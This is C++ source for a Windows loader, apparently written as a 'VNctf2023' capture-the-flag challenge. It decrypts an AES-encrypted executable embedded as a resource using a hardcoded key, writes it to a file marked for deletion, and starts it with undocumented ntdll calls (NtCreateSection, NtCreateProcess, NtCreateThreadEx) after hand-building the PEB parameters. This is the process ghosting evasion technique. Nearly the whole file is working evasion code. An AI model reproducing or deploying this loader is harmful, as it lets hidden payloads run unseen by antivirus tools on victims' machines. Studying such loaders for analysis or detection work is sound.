#include <stdio.h>
#include <stdint.h>
#include <Windows.h>
#include <userenv.h>
#define IDR_SHELL2                      102
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
#define ECB 1

#include "aes.h"
#include "NTHelper.h"
#include "main.h"


#pragma comment(lib, "Userenv.lib")

#pragma warning(disable : 4996)

FARPROC MyGetProcAddress(LPCSTR lpszName)
{
	return GetProcAddress(GetModuleHandleA("ntdll"), lpszName);
}

LPVOID WriteParamsToProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS lpParams)
{
	if (lpParams == NULL) {
		printf("Failed - Null Params");
		return nullptr;
	}

	PVOID lpBuffer = lpParams;
	ULONG_PTR ullBufferEnd = (ULONG_PTR)lpParams + lpParams->Length;

	if (lpParams->Environment) {
		if ((ULONG_PTR)lpParams > (ULONG_PTR)lpParams->Environment)
			lpBuffer = (PVOID)lpParams->Environment;

		ULONG_PTR ullEnvEnd = (ULONG_PTR)lpParams->Environment + lpParams->EnvironmentSize;

		if (ullEnvEnd > ullBufferEnd)
			ullBufferEnd = ullEnvEnd;
	}

	SIZE_T ulBufferSize = ullBufferEnd - (ULONG_PTR)lpBuffer;

	if (VirtualAllocEx(hProcess, lpBuffer, ulBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		if (!WriteProcessMemory(hProcess, (LPVOID)lpParams, (LPVOID)lpParams, lpParams->Length, NULL)) {
			printf("Failed - Writing RemoteProcessParams failed");
			return nullptr;
		}

		if (lpParams->Environment) {
			if (!WriteProcessMemory(hProcess, (LPVOID)lpParams->Environment, (LPVOID)lpParams->Environment, lpParams->EnvironmentSize, NULL)) {
				printf("Failed - Writing environment failed");
				return nullptr;
			}
		}
		return (LPVOID)lpParams;
	}

	if (!VirtualAllocEx(hProcess, (LPVOID)lpParams, lpParams->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		printf("Failed - Allocating RemoteProcessParams failed");
		return nullptr;
	}

	if (!WriteProcessMemory(hProcess, (LPVOID)lpParams, (LPVOID)lpParams, lpParams->Length, NULL)) {
		printf("Failed - Writing RemoteProcessParams failed");
		return nullptr;
	}

	if (lpParams->Environment) {
		if (!VirtualAllocEx(hProcess, (LPVOID)lpParams->Environment, lpParams->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
			printf("Failed - Allocating environment failed");
			return nullptr;
		}
		if (!WriteProcessMemory(hProcess, (LPVOID)lpParams->Environment, (LPVOID)lpParams->Environment, lpParams->EnvironmentSize, NULL)) {
			printf("Failed - Writing environment failed");
			return nullptr;
		}
	}

	return (LPVOID)lpParams;
}

BOOL WriteParamsToPEB(PVOID lpParamsBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& stPBI)
{
	// Get access to the remote PEB:
	ULONGLONG ullPEBAddress = (ULONGLONG)stPBI.PebBaseAddress;
	if (!ullPEBAddress) {
		printf("Failed - Getting remote PEB address error!");
		return FALSE;
	}

	PEB stPEBCopy = { 0 };
	ULONGLONG ullOffset = (ULONGLONG)&stPEBCopy.ProcessParameters - (ULONGLONG)&stPEBCopy;

	// Calculate offset of the parameters
	LPVOID lpIMGBase = (LPVOID)(ullPEBAddress + ullOffset);

	//Write parameters address into PEB:
	SIZE_T lpulWritten = 0;
	if (!WriteProcessMemory(hProcess, lpIMGBase, &lpParamsBase, sizeof(PVOID), &lpulWritten)) {
		printf("Failed - Cannot update Params!");
		return FALSE;
	}

	return TRUE;
}

BOOL ReadPEB(HANDLE hProcess, PROCESS_BASIC_INFORMATION& lpstPBI, OUT PEB& lpstPEB)
{
	memset(&lpstPEB, 0, sizeof(PEB));

	PPEB lpstPEBAddress = lpstPBI.PebBaseAddress;

	//printf("PEB address: %I64X", (ULONGLONG)remote_peb_addr);

	DEFINE_GETDLL(NtReadVirtualMemory);

	NTSTATUS ntAux = pfNtReadVirtualMemory(hProcess, lpstPEBAddress, &lpstPEB, sizeof(PEB), NULL);

	if (!NT_SUCCESS(ntAux)) {
		printf("Cannot read remote PEB - %08X", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL SetProcessArgumentsAndEnv(HANDLE hProcess, PROCESS_BASIC_INFORMATION& stPI, LPWSTR lpwzTargetPath)
{
	PROCESS_BASIC_INFORMATION stPBI = { 0 };
	DWORD dwReturnLength = 0;

	DEFINE_GETDLL(NtQueryInformationProcess);

	NTSTATUS ntAux = pfNtQueryInformationProcess(hProcess, ProcessBasicInformation, &stPBI, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);

	if (!NT_SUCCESS(ntAux)) {
		printf("Failed - NtQueryInformationProcess failed\r\n");
		return FALSE;
	}

	DEFINE_GETDLL(RtlInitUnicodeString);

	UNICODE_STRING uTargetPath = { 0 };

	pfRtlInitUnicodeString(&uTargetPath, lpwzTargetPath);
	//---
	wchar_t wzDirPath[MAX_PATH] = { 0 };

	GetCurrentDirectoryW(MAX_PATH, wzDirPath);

	UNICODE_STRING uCurrentDir = { 0 };
	pfRtlInitUnicodeString(&uCurrentDir, wzDirPath);
	//---
	UNICODE_STRING uDllDir = { 0 };
	pfRtlInitUnicodeString(&uDllDir, L"C:\\Windows\\System32");
	//---
	UNICODE_STRING uWindowName = { 0 };
	pfRtlInitUnicodeString(&uWindowName, L"VNctf");

	LPVOID lpEnv;

	CreateEnvironmentBlock(&lpEnv, NULL, TRUE);

	DEFINE_GETDLL(RtlCreateProcessParameters);

	PRTL_USER_PROCESS_PARAMETERS lpstProcessParams = nullptr;
	ntAux = pfRtlCreateProcessParameters(&lpstProcessParams, (PUNICODE_STRING)&uTargetPath, (PUNICODE_STRING)&uDllDir, (PUNICODE_STRING)&uCurrentDir, (PUNICODE_STRING)&uTargetPath, lpEnv, (PUNICODE_STRING)&uWindowName, nullptr, nullptr, nullptr);

	if (!NT_SUCCESS(ntAux)) {
		printf("Failed - RtlCreateProcessParameters failed");
		return FALSE;
	}

	LPVOID lpParams = WriteParamsToProcess(hProcess, lpstProcessParams);

	if (!lpParams)
		return FALSE;

	PEB stPEBCopy = { 0 };
	if (!ReadPEB(hProcess, stPI, stPEBCopy)) {
		printf("Failed - Cannot Read Remote Process");
		return FALSE;
	}

	if (!WriteParamsToPEB(lpParams, hProcess, stPI)) {
		printf("Failed - Cannot update PEB: %08X", GetLastError());
		return FALSE;
	}

	if (!ReadPEB(hProcess, stPI, stPEBCopy)) {
		printf("Failed - Cannot Read Remote Process");
		return FALSE;
	}

	return TRUE;
}

BYTE* GetNTHeaders(const BYTE* lpData)
{
	if (lpData == NULL)
		return NULL;

	IMAGE_DOS_HEADER* lpIDH = (IMAGE_DOS_HEADER*)lpData;

	if (lpIDH->e_magic != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}

	LONG lPEOffset = lpIDH->e_lfanew;

	if (lPEOffset > 1024)
		return NULL;

	IMAGE_NT_HEADERS32* lpstINH = (IMAGE_NT_HEADERS32*)(lpData + lPEOffset);

	if (lpstINH->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	return (BYTE*)lpstINH;
}

WORD GetArchitecture(const BYTE* lpData)
{
	void* lpAux = GetNTHeaders(lpData);

	if (lpAux == NULL)
		return 0;

	IMAGE_NT_HEADERS32* lpstINH = (IMAGE_NT_HEADERS32*)(lpAux);

	return lpstINH->FileHeader.Machine;
}

DWORD GetEntryPointRVA(const BYTE* lpData)
{
	BYTE* lpNTHeaders = GetNTHeaders(lpData);

	if (lpNTHeaders == NULL)
		return 0;

	IMAGE_NT_HEADERS32* lpINTH = (IMAGE_NT_HEADERS32*)(lpNTHeaders);
	WORD wArchitecture = lpINTH->FileHeader.Machine;
	DWORD dwEntryPointAddress = 0;

	if (wArchitecture == IMAGE_FILE_MACHINE_AMD64) {
		IMAGE_NT_HEADERS64* lpINTH64 = (IMAGE_NT_HEADERS64*)lpNTHeaders;
		dwEntryPointAddress = lpINTH64->OptionalHeader.AddressOfEntryPoint;
	}
	else {
		IMAGE_NT_HEADERS32* lpINTH32 = (IMAGE_NT_HEADERS32*)lpNTHeaders;
		dwEntryPointAddress = (ULONGLONG)(lpINTH32->OptionalHeader.AddressOfEntryPoint);
	}

	return dwEntryPointAddress;
}

BOOL GetImageEntryPointRVA(HANDLE hFile, unsigned int& uiEntryPointRva, DWORD dwFileSize)
{
	uiEntryPointRva = 0;

	ULARGE_INTEGER ulMappingSize;

	ulMappingSize.QuadPart = dwFileSize;

	HANDLE hMap = CreateFileMapping(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);

	if (hMap == NULL) {
		printf("Failed - Cannot create a map from the File %08X", GetLastError());
		return FALSE;
	}

	LPVOID lpMap = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, ulMappingSize.LowPart);

	if (lpMap == nullptr) {
		printf("Failed - Cannot map the File %08X", GetLastError());
		CloseHandle(hMap);
		return FALSE;
	}

	uiEntryPointRva = GetEntryPointRVA((BYTE*)lpMap);

	CloseHandle(hMap);
	UnmapViewOfFile(lpMap);

	return TRUE;
}

DWORD EncryptString(const unsigned char* lpData, const char* lpKey, unsigned char*& lpOut, DWORD dwDataSize)
{
	unsigned char btBlock[16];
	unsigned char btKey[16];
	unsigned int dwOutLen = 0;
	unsigned int iMul = 0;

	if ((dwDataSize % 16))
		iMul = 1;

	dwOutLen = ((dwDataSize / 16) + iMul) * 16;

	lpOut = (unsigned char*)malloc(dwOutLen + 1);

	memset(lpOut, 0x00, dwOutLen + 1);

	memset(btKey, 0x00, 16);

	memcpy(btKey, lpKey, strlen(lpKey) > 16 ? 16 : strlen(lpKey));

	for (int i = 0; i * 16 < dwDataSize; ++i) {

		unsigned int uiBlockSize = 16;

		if ((dwDataSize - (i * 16)) < 16)
			uiBlockSize = (dwDataSize - (i * 16));

		memset(btBlock, 0x00, 16);
		memcpy(btBlock, lpData + (i * 16), uiBlockSize);

		AES_ECB_encrypt(lpData + (i * 16), btKey, lpOut + (i * 16), 16);
	}

	return dwOutLen;
}

DWORD DecryptString(const unsigned char* lpData, const char* lpKey, unsigned char*& lpOut, DWORD dwDataSize)
{
	unsigned char btKey[16];
	unsigned int dwOutLen = 0;
	unsigned int iMul = 0;

	if ((dwDataSize % 16))
		iMul = 1;

	dwOutLen = ((dwDataSize / 16) + iMul) * 16;

	lpOut = (unsigned char*)malloc(dwOutLen + 1);

	memset(lpOut, 0x00, dwOutLen + 1);

	memset(btKey, 0x00, 16);

	memcpy(btKey, lpKey, strlen(lpKey) > 16 ? 16 : strlen(lpKey));

	for (int i = 0; i * 16 < dwDataSize; ++i) {
		AES_ECB_decrypt(lpData + (i * 16), btKey, lpOut + (i * 16), 16);
	}

	return dwOutLen;
}

void EncryptFile(const char* lpszSourceFile, const char* lpszKey)
{

	HANDLE hSourceFile = CreateFile(lpszSourceFile, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

	if (hSourceFile == INVALID_HANDLE_VALUE) {
		return;
	}

	DWORD dwAux, dwFileSize = GetFileSize(hSourceFile, nullptr);

	if (dwFileSize == INVALID_FILE_SIZE || dwFileSize == 0) {
		return;
	}

	BYTE* lpBuffer = (BYTE*)malloc(dwFileSize + 1);

	memset(lpBuffer, 0x00, dwFileSize + 1);

	if (!ReadFile(hSourceFile, lpBuffer, dwFileSize, &dwAux, nullptr) || dwAux != dwFileSize) {
		CloseHandle(hSourceFile);
		return;
	}

	CloseHandle(hSourceFile);

	char* lpszTargetFile = (char*)malloc(strlen(lpszSourceFile) + 5);

	memset(lpszTargetFile, 0x00, strlen(lpszSourceFile) + 5);

	sprintf(lpszTargetFile, "%s.khe", lpszSourceFile);

	HANDLE hTargetFile = CreateFile(lpszTargetFile, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);

	if (hTargetFile == INVALID_HANDLE_VALUE) {
		return;
	}

	free(lpszTargetFile);


	unsigned char* lpszEncryptedString = nullptr;

	DWORD dwEncryptedSize = EncryptString(lpBuffer, lpszKey, lpszEncryptedString, dwFileSize);

	free(lpBuffer);


	dwAux = 0;

	if (!WriteFile(hTargetFile, lpszEncryptedString, dwEncryptedSize, &dwAux, nullptr)) {
		printf("Failed - Error Code %08X\r\n", GetLastError());
		CloseHandle(hTargetFile);
		return;
	}

	free(lpszEncryptedString);

	if (!WriteFile(hTargetFile, (LPVOID)&dwFileSize, 4, nullptr, nullptr)) {
		printf("Failed - Error Code %08X\r\n", GetLastError());
		CloseHandle(hTargetFile);
		return;
	}


	CloseHandle(hTargetFile);
}

void ExecuteFile(char* filePath)
{
	char lpszTargetFile[] = "VNctf2023";
	char lpszKey[] = "s0rryla";
	HANDLE hTargetFile = CreateFile(lpszTargetFile, GENERIC_READ | GENERIC_WRITE | DELETE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	NTSTATUS ntAux;

	if (hTargetFile == INVALID_HANDLE_VALUE) {
		printf("Failed - Error Code %08X\r\n", GetLastError());
		return;
	}


	FILE_DISPOSITION_INFORMATION stFileInfo;
	stFileInfo.DeleteFileA = TRUE;
	IO_STATUS_BLOCK stIOStatus;

	DEFINE_GETDLL(NtSetInformationFile);


	ntAux = pfNtSetInformationFile(hTargetFile, &stIOStatus, &stFileInfo, sizeof(stFileInfo), FILE_INFORMATION_CLASS::FileDispositionInformation);

	if (!NT_SUCCESS(stIOStatus.Status)) {
		printf("Failed - Error Code %08X\r\n", ntAux);
		CloseHandle(hTargetFile);
		return;
	}

	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_SHELL2), "shell");
	if (NULL == hRsrc) {
	}
	DWORD dwSize = SizeofResource(NULL, hRsrc);
	if (0 == dwSize) {
	}
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (NULL == hGlobal) {
	}
	LPVOID pBuffer = LockResource(hGlobal);
	if (NULL == pBuffer) {
	}

	DWORD dwAux = 0;
	DWORD dwOriginalSize = 0;
	DWORD dwFileSize = dwSize - 4;
	unsigned char* lpSource = (unsigned char*)malloc(dwFileSize);
	memcpy(lpSource, pBuffer, dwFileSize);
	memcpy(&dwOriginalSize, (void*)((unsigned long long int)pBuffer + dwFileSize), 4);

	GlobalUnlock(hGlobal);


	unsigned char* lpPayload = nullptr;

	dwAux = DecryptString(lpSource, lpszKey, lpPayload, dwFileSize);

	if (dwAux < dwOriginalSize || lpPayload == nullptr) {
		CloseHandle(hTargetFile);
		return;
	}

	if (!WriteFile(hTargetFile, (LPCVOID)lpPayload, dwOriginalSize, &dwAux, nullptr)) {
		CloseHandle(hTargetFile);
		return;
	}


	free(lpSource);
	free(lpPayload);

	DEFINE_GETDLL(NtCreateSection);

	HANDLE hSectionHandle;


	ntAux = pfNtCreateSection(&hSectionHandle, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTargetFile);

	if (!NT_SUCCESS(ntAux)) {
		CloseHandle(hTargetFile);
		return;
	}

	uint32_t imageEntryPointRva;


	if (!GetImageEntryPointRVA(hTargetFile, imageEntryPointRva, dwOriginalSize)) {
		return;
	}

	CloseHandle(hTargetFile);


	HANDLE hProcess = nullptr;

	DEFINE_GETDLL(NtCreateProcess);


	ntAux = pfNtCreateProcess(&hProcess, PROCESS_ALL_ACCESS, nullptr, GetCurrentProcess(), TRUE, hSectionHandle, NULL, NULL);

	if (!NT_SUCCESS(ntAux)) {
		return;
	}

	PROCESS_BASIC_INFORMATION stPBI = { 0 };
	DWORD ReturnLength = 0;

	DEFINE_GETDLL(NtQueryInformationProcess);

	ntAux = pfNtQueryInformationProcess(hProcess, ProcessBasicInformation, &stPBI, sizeof(stPBI), nullptr);

	if (!NT_SUCCESS(ntAux)) {
		return;
	}

	char* key = (char*)malloc(4);
	sprintf(key, "%x", dwAux);

	int len = strlen(lpszTargetFile);
	int lenFile = strlen(filePath);
	int lenKey = strlen(key);
	strcat(lpszTargetFile, " ");
	strcat(lpszTargetFile, filePath);
	strcat(lpszTargetFile, " ");
	strcat(lpszTargetFile, key);
	len = len + lenFile + lenKey + 2;
	wchar_t* lpwzAux = (wchar_t*)malloc((len + 1) * 2);
	memset(lpwzAux, 0x00, (len + 1) * 2);
	mbstowcs(lpwzAux, lpszTargetFile, len);
	//wchar_t* lpwzAux = (wchar_t*)malloc((strlen(lpszTargetFile) + 1 ) * 2);

	//memset(lpwzAux, 0x00, (strlen(lpszTargetFile) + 1) * 2);

	//mbstowcs(lpwzAux, lpszTargetFile, strlen(lpszTargetFile));

	if (!SetProcessArgumentsAndEnv(hProcess, stPBI, lpwzAux))
		return;

	free(lpwzAux);

	PEB stPEBCopy = { 0 };

	if (!ReadPEB(hProcess, stPBI, stPEBCopy))
		return;

	ULONGLONG ullImageBase = (ULONGLONG)stPEBCopy.ImageBaseAddress;
	ULONGLONG ullProcEntry = imageEntryPointRva + ullImageBase;

	HANDLE hThread = NULL;

	DEFINE_GETDLL(NtCreateThreadEx);

	ntAux = pfNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)ullProcEntry, NULL, FALSE, 0, 0, 0, NULL);

	if (!NT_SUCCESS(ntAux)) {
		return;
	}

	WaitForSingleObject(hProcess, INFINITE);

}

int main(int argc, char* argv[])
{
	char* filePath = argv[0];

	ExecuteFile(filePath);

	return 0;
}